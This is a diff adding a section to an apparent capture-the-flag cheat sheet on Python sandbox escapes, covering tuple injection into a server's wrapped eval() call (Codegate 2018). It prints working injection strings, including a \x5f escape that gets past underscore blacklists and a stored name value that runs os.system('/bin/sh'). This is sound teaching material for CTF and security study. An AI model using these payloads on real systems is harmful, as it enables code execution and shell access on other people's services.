@@ -40,6 +40,7 @@
   - [When \_\_loader\_\_ Is Not Available](#when-__loader__-is-not-available)
 - [Quine + Context Detection for Code Execution (BearCatCTF 2026)](#quine--context-detection-for-code-execution-bearcatctf-2026)
 - [Restricted Character Repunit Decomposition (BearCatCTF 2026)](#restricted-character-repunit-decomposition-bearcatctf-2026)
+- [Python eval() Jail Escape via Tuple Injection (Codegate 2018)](#python-eval-jail-escape-via-tuple-injection-codegate-2018)
 - [Hints Cheat Sheet](#hints-cheat-sheet)
 
 ---
@@ -461,6 +462,26 @@ expr = '+'.join(terms)  # e.g., "111...1+111...1+11+1+1"
 **Key insight:** Any positive integer can be written as a sum of repunits (numbers like 1, 11, 111, ...). The greedy algorithm produces ~O(log²(n)) terms. This converts a 2-character constraint into arbitrary code execution via `long_to_bytes()`. On the second unrestricted prompt, run `open('/flag.txt').read()`.
 
 **Detection:** Challenge restricts input character set to exactly 2 characters. Double-eval pattern (`eval(decode(eval(...)))`).
+
+---
+
+## Python eval() Jail Escape via Tuple Injection (Codegate 2018)
+
+When the server does `eval("your." + input + "()")`, inject a tuple to execute arbitrary code:
+
+```python
+# Server code: eval("your." + user_input + "()")
+# Inject: dig(),eval(eval('raw\x5finput()')),
+# Becomes: eval("your.dig(),eval(eval('raw\x5finput()')),()") 
+# = tuple of (your.dig(), eval(arbitrary), None)
+
+# Alternative: inject payload via Name variable during registration
+# Name = "__import__('os').system('/bin/sh')"
+# Input: dig(),eval(name),exit
+# eval("your.dig(),eval(name),exit()") -> executes payload from name
+```
+
+**Key insight:** Python `eval()` on a comma-separated expression creates a tuple, allowing multiple expressions to execute. `\x5f` hex escapes bypass underscore blacklists. When direct code injection is blocked, store payload in a variable (registration name, environment) and reference it via `eval(varname)` in the eval context. The general pattern: if the server wraps your input in `eval("prefix" + input + "suffix")`, use commas to break out of the intended expression and inject additional expressions as tuple elements.
 
 ---
 
